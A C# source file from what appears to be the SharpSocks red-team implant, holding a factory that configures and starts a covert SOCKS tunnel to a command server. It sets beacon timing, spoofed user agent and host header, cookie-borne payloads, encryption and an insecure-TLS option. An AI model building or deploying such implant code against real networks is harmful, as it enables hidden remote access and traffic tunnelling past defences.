using System;
using System.Collections.Generic;
using System.Net;
using SharpSocksCommon.Encryption;
using SharpSocksImplant.Config;
using SharpSocksImplant.Logging;
using SharpSocksImplant.Socks;

namespace SharpSocksImplant.Integration
{
    public static class PoshCreateProxy
    {
        public static SocksController CreateSocksController(Uri serverUri, string commandChannelId, string hostHeader, string userAgent, string key, List<string> urlPaths,
            string sessionCookieName, string payloadCookieName, ushort timeBetweenReads, IWebProxy wbProxy, short beaconTime, IImplantLog implantComms, bool insecureTLS = false)
        {
            // TODO these should be set
            var implantLog = implantComms ?? new PoshDefaultImplantComms(null, null, null, null);
            var config = new SocksClientConfiguration
            {
                CommandChannelSessionId = commandChannelId,
                BeaconTime = beaconTime,
                UserAgent = userAgent,
                CommandServerUi = serverUri,
                UseProxy = wbProxy != null,
                WebProxy = wbProxy,
                UrlPaths = urlPaths,
                HostHeader = hostHeader,
                PayloadCookieName = payloadCookieName,
                SessionCookieName = sessionCookieName,
                InsecureTLS = insecureTLS,
                TimeBetweenReads = timeBetweenReads,
            };
            if (key == null)
                throw new Exception("Encryption key is null");
            var socksController = new SocksController(config)
            {
                Encryptor = new RijndaelCBCCryptor(key),
                ImplantComms = implantLog
            };
            socksController.Initialize();
            return socksController;
        }
    }
}